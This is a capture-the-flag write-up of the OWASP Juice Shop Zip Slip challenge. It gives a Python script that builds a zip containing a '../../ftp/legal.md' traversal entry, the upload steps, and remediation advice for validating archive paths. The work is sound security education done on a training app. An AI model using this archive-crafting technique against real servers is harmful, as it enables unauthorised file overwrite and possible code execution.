# Arbitrary File Write — OWASP Juice Shop

**Category:** Vulnerable Components
**Difficulty:** ★★★★ (6 stars)
**Vulnerability:** Zip Slip (Path Traversal via archive extraction)
**Goal:** Overwrite the `legal.md` (Legal Information) file on the server.
**Video walkthrough:** [Watch on Loom](https://www.loom.com/share/063c85fb6c1540f6a577264bdb93f4b2)

---

:::caution Educational purposes only
Performed on a local, personal OWASP Juice Shop instance. Never test these techniques on systems you do not own or have explicit permission to test.
:::

## 1. Summary

The *File Complaint* feature lets a logged-in user upload a `.zip` file. The
server extracts the archive into `uploads/complaints/` but **does not sanitize
the file names inside the archive**. By placing a path-traversal sequence
(`../../`) in an entry name, an attacker can escape the target directory and
write to an arbitrary location in the project — in this case overwriting
`ftp/legal.md`.

This class of bug is known as **Zip Slip**.

---

## 2. Vulnerable Flow

```
uploads/complaints/  +  <name stored inside the zip>
```

The server trusts the name coming from the archive and only checks that the
final path stays "somewhere inside the project" — it never rejects `..`.

A crafted entry name:

```
../../ftp/legal.md
```

resolves to:

```
uploads/complaints/../../ftp/legal.md
        └── .. ──► uploads/
                └── .. ──► project root
                        └── ftp/legal.md   ← overwritten
```

---

## 3. Exploitation

### Step 1 — Build the malicious archive

Normal archivers (7-Zip, Windows Explorer, `unzip`) strip `../` from entry
names (anti-Zip-Slip protection), so the archive is crafted with Python, whose
`writestr` keeps the name exactly as given.

`make_zip.py`:

```python
import zipfile

with zipfile.ZipFile("exploit.zip", "w") as z:
    z.writestr("../../ftp/legal.md", "Hacked by Vadim")
```

```bash
python3 make_zip.py
```

### Step 2 — Verify the payload

```bash
unzip -l exploit.zip
```

Expected output lists the traversal path:

```
../../ftp/legal.md
```

### Step 3 — Deliver it

1. Log in to Juice Shop (any account).
2. Open **Customer Feedback → File Complaint** (`/#/complain`).
3. **Message:** any text.
4. **Invoice:** select `exploit.zip`.
5. **Submit.**

The server extracts the archive and overwrites `ftp/legal.md`.

### Step 4 — Confirm

```bash
cat ftp/legal.md
```

Output:

```
Hacked by Vadim
```

The **Arbitrary File Write** challenge is now solved on the Score Board.

---

## 4. Why a ZIP (and not a direct upload)?

A directly uploaded file cannot carry `../` in its name — the browser and OS
block it. Inside a ZIP, however, the entry name is just a string. Juice Shop
reads that string and uses it to build a file path without cleaning it, so the
traversal survives.

---

## 5. Remediation

:::tip Key takeaway
Validate and restrict untrusted input on the server side; never rely on the client or on outdated components.
:::

When extracting any user-supplied archive on the server:

- Normalize and resolve every entry path **before** writing.
- Reject any entry whose resolved path escapes the intended target directory
  (contains `..` or does not start with the target root).
- Prefer a maintained, Zip-Slip-safe extraction library and keep it updated.

```
target = resolve(destDir, entryName)
if not target.startswith(resolve(destDir) + os.sep):
    raise SecurityError("Path traversal blocked")
```

---

## 6. Impact

:::danger Why it matters
See the consequences below: this flaw can seriously affect the availability, integrity or confidentiality of the application.
:::

Arbitrary file write on the server can lead to overwriting configuration,
source files, or startup scripts — escalating to **remote code execution** in
the worst case. Here it is limited to defacing the legal document, but the
underlying primitive is the same.
